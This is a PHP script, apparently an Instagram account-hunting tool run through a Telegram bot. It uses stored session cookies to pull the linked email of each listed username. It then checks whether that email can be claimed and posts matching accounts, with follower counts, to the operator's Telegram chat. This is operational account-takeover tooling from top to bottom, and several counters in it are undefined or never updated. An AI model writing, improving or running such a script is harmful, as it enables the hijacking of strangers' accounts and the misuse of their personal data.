<?php
date_default_timezone_set('Asia/Baghdad');
$config = json_decode(file_get_contents('config.json'),1);
$id = $config['id'];
$token = $config['token'];
$config['filter'] = $config['filter'] != null ? $config['filter'] : 1;
$screen = file_get_contents('screen');
exec('kill -9 ' . file_get_contents($screen . 'pid'));
file_put_contents($screen . 'pid', getmypid());
include 'index.php';
$accounts = json_decode(file_get_contents('accounts.json') , 1);
$cookies = $accounts[$screen]['cookies'] . $accounts[$screen]['sessionid'];
$useragent = $accounts[$screen]['useragent'];
$users = explode("\n", file_get_contents($screen));
$uu = explode(':', $screen) [0];
$se = 0;
$i = 0;
$gmail = 0;
$hotmail = 0;
$yahoo = 0;
$mailru = 0;
$BKC = 0;
$true = 0;
$false = 0;
$NotBussines = 0;
$edit = bot('sendMessage',[
    'chat_id'=>$id,
    'text'=>"˹ @FFFKK ˼ 𓆪 💻",
    'parse_mode'=>'markdown',
    'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>' 𝙽𝚄𝙼𝙱𝙴𝚁 𝚄𝚂𝙴𝚁𝚂 ✔: '.$i,'callback_data'=>'fgf']],
                [['text'=>'𝙸𝙽 𝚄𝚂𝙴𝚁 ✔: '.$user,'callback_data'=>'fgdfg']],
                [['text'=>"Gmail: $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo: $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'MailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail: '.$hotmail,'callback_data'=>'ghj']],
                [['text'=>"Aol : $BKC",'callback_data'=>'fgjjjvf']],
                [['text'=>'𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴:'.$true,'callback_data'=>'gj']],
                [['text'=>'𝙽𝙾𝚃 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴: '.$false,'callback_data'=>'dghkf'],['text'=>'𝙽𝙾𝚃 𝙱𝚄𝚂𝙸𝙽𝙴𝚂𝚂: '.$NotBussines,'callback_data'=>'dgdge']]
            ]
        ])
]);
$se = 100;
$editAfter = 1;
foreach ($users as $user) {
    $info = getInfo($user, $cookies, $useragent);
    if ($info != false and !is_string($info)) {
        $mail = trim($info['mail']);
        $usern = $info['user'];
        $e = explode('@', $mail);
               if (preg_match('/(live|hotmail|outlook|yahoo|Yahoo|yAhoo|aol|aOl|Aol)\.(.*)|(gmail)\.(com)|(mail|bk|yandex|inbox|list)\.(ru)/i', $mail,$m)) {
            echo 'check ' . $mail . PHP_EOL;
            $za +=1;
                    if(checkMail($mail)){
                        $inInsta = inInsta($mail);
                        if ($inInsta !== false) {
                            // if($config['filter'] <= $follow){
                                echo "True - $user - " . $mail . "\n";
                                if(strpos($mail, 'gmail.com')){
                                    $gmail += 1;
                                } elseif(strpos($mail, 'aol')){ 
                               	$akilaol = 1;
                                } elseif(strpos($mail, 'hotmail.') or strpos($mail,'outlook.') or strpos($mail,'live.com')){
                                    $hotmail += 1;
                                } elseif(strpos($mail, 'yahoo')){
                                    $yahoo += 1;
                                } elseif(preg_match('/(mail|bk|yandex|inbox|list)\.(ru)/i', $mail)){
                                    $mailru += 1;
                                }
                                $follow = $info['f'];
                                $following = $info['ff'];
                                $media = $info['m'];
                                bot('sendMessage', ['disable_web_page_preview' => true, 'chat_id' => $id, 'text' => "˹ 𝑯𝒊 𝑵𝒆𝒘 𝑨𝒄𝒄𝒐𝒖𝒏𝒕  ˼ 𓆪 💻
━━━━━━━━━━━━
🧲 • 𝑨𝑪𝑪𝑶𝑼𝑵𝑻 : [$usern](instagram.com/$usern)
👤 • 𝑼𝑺𝑬𝑹 : `$usern`
📧 • 𝑬𝑴𝑨𝑰𝑳  : `$mail`
👥 • 𝑭𝑶𝑳𝑳𝑶𝑾𝑬𝑹𝑺  : $follow
〽️ • 𝑭𝑶𝑳𝑳𝑶𝑾𝑰𝑵𝑮 : $following
🤳 • 𝑷𝑶𝑺𝑻 : $media
⌚ • 𝑫𝑨𝑻𝑬 : ".date("Y")."/".date("n")."/".date("d")." : " . date('g:i') . " 
━━━━━━━━━━━━
˹ @FFFKK ˼ 𓆪 💻",      
                                'parse_mode'=>'markdown']);
                                
                                bot('editMessageReplyMarkup',[
                                    'chat_id'=>$id,
                                    'message_id'=>$edit->result->message_id,
                                    'reply_markup'=>json_encode([
                                        'inline_keyboard'=>[
                                            [['text'=>' 𝙽𝚄𝙼𝙱𝙴𝚁 𝚄𝚂𝙴𝚁𝚂 ✔: '.$i,'callback_data'=>'fgf']],
                                            [['text'=>'𝙸𝙽 𝚄𝚂𝙴𝚁 ✔: '.$user,'callback_data'=>'fgdfg']],
                                            [['text'=>"Gmail: $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo: $yahoo",'callback_data'=>'gdfgfd']],
                                            [['text'=>'MailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail: '.$hotmail,'callback_data'=>'ghj']],[['text'=>"protonmail: $kr",'callback_data'=>'fffttttrr']],
                                            [['text'=>"Aol : $BKC",'callback_data'=>'fgjjjvf']],
                                            [['text'=>'𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴:'.$true,'callback_data'=>'gj']],
                                            [['text'=>'𝙽𝙾𝚃 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴: '.$false,'callback_data'=>'dghkf'],['text'=>'𝙽𝙾𝚃 𝙱𝚄𝚂𝙸𝙽𝙴𝚂𝚂️: '.$NotBussines,'callback_data'=>'dgdge']]
                                        ]
                                    ])
                                ]);
                                $true += 1;
                            // } else {
                            //     echo "Filter , ".$mail.PHP_EOL;
                            // }
                            
                        } else {
                          echo "No Rest $mail\n";
                        }
                    } else {
                        $false +=1;
                        echo "Not Vaild 2 - $mail\n";
                    }
        } else {
          echo "BlackList - $mail\n";
        }
    } else {
         $NotBussines +=1;
        echo "NotBussines - $user\n";
    }
    usleep(750000);
    $i++;
    if($i == $editAfter){
        bot('editMessageReplyMarkup',[
            'chat_id'=>$id,
            'message_id'=>$edit->result->message_id,
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>' 𝙽𝚄𝙼𝙱𝙴𝚁 𝚄𝚂𝙴𝚁𝚂 ✔: '.$i,'callback_data'=>'fgf']],
                    [['text'=>'𝙸𝙽 𝚄𝚂𝙴𝚁 ✔: '.$user,'callback_data'=>'fgdfg']],
                    [['text'=>"Gmail: $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo: $yahoo",'callback_data'=>'gdfgfd']],
                    [['text'=>'MailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail: '.$hotmail,'callback_data'=>'ghj']],[['text'=>"protonmail: $kr",'callback_data'=>'fffttttrr']],
                    [['text'=>"Aol : $BKC",'callback_data'=>'fgjjjvf']],
                    [['text'=>'𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴:'.$true,'callback_data'=>'gj']],
                    [['text'=>'𝙽𝙾𝚃 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴: '.$false,'callback_data'=>'dghkf'],['text'=>'𝙽𝙾𝚃 𝙱𝚄𝚂𝙸𝙽𝙴𝚂𝚂: '.$NotBussines,'callback_data'=>'dgdge']]
                ]
            ])
        ]);
        $editAfter += 1;
    }
}
bot('sendMessage', ['chat_id' => $id, 'text' =>"𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙴𝙽𝙳 🇸🇾 : ".explode(':',$screen)[0]]);

